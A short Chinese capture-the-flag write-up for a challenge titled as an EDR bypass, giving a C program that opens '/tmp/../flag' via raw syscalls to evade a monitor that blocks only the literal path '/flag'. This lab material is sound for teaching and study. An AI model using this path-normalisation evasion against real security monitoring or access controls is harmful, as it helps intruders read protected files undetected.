# 内网渗透与高级社工-终端EDR绕过-G4 WriteUp

本题在G3的基础上又审计了syscall，所有对`/flag`的读取都会被截获，使用相对路径可以绕过

```c
#include <stdio.h>
#include <sys/syscall.h> // SYS_open, SYS_read操作符定义
#include <unistd.h> //unix standard，syscall函数

char buffer[100];

int main() {
    long fd = syscall(SYS_open, "/tmp/../flag", 0); 
    syscall(SYS_read, fd, buffer, sizeof(buffer));
    printf("%s\n", buffer);
    return 0;
}
```

`/tmp/../flag`等同与`/flag`，但是EDR只拦截`/flag`，由此成功获取到flag。